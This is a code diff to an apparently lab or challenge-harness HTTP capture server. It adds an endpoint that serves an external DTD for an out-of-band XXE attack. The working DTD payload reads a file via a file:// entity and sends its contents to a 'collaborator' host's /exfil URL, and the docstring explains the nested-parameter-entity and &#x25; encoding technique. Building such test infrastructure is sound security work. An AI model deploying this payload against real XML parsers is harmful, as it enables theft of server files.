@@ -95,6 +95,14 @@ class CaptureHTTPHandler(BaseHTTPRequestHandler):
             self._serve_captures()
             return
 
+        # GET /evil.dtd?f=<path> is p5_5's external-DTD server. It serves a
+        # parameterized exfil DTD without being recorded as a capture itself
+        # (the DTD fetch is infrastructure noise; the meaningful capture is
+        # the subsequent /exfil hit that carries the actual flag data).
+        if self.command == "GET" and parsed.path == "/evil.dtd":
+            self._serve_evil_dtd(parse_qs(parsed.query))
+            return
+
         length = int(self.headers.get("Content-Length", 0) or 0)
         body_bytes = self.rfile.read(length) if length else b""
         try:
@@ -126,6 +134,37 @@ class CaptureHTTPHandler(BaseHTTPRequestHandler):
         body = json.dumps(_captures_snapshot()).encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(body)))
+        self.end_headers()
+        self.wfile.write(body)
+
+    def _serve_evil_dtd(self, params: dict) -> None:
+        """Serve the external exfil DTD for p5_5 OOB XXE.
+
+        The DTD uses the classic nested-parameter-entity technique:
+          1. %file; reads the target file via a file:// SYSTEM reference.
+          2. %eval; defines a new %exfil; entity whose SYSTEM identifier
+             embeds %file;'s resolved value as a query parameter.
+          3. %exfil; fires a network request to /exfil?d=<file_contents>,
+             which the capture handler logs as a normal HTTP capture.
+
+        &#x25; is used instead of a literal % inside the %eval; value
+        because a literal percent-sign inside a quoted parameter-entity
+        value is not allowed in internal DTD subsets; character-entity
+        encoding it here works because this content is served as an
+        *external* DTD, where the parser re-parses it in a context that
+        allows nested parameter-entity declarations.
+        """
+        file_path = (params.get("f") or [""])[0] or "/opt/king/dispatch.txt"
+        dtd = (
+            '<!ENTITY % file SYSTEM "file://' + file_path + '">\n'
+            '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://collaborator/exfil?d=%file;\'>">\n'
+            "%eval;\n"
+            "%exfil;\n"
+        )
+        body = dtd.encode("utf-8")
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
         self.send_header("Content-Length", str(len(body)))
         self.end_headers()
         self.wfile.write(body)
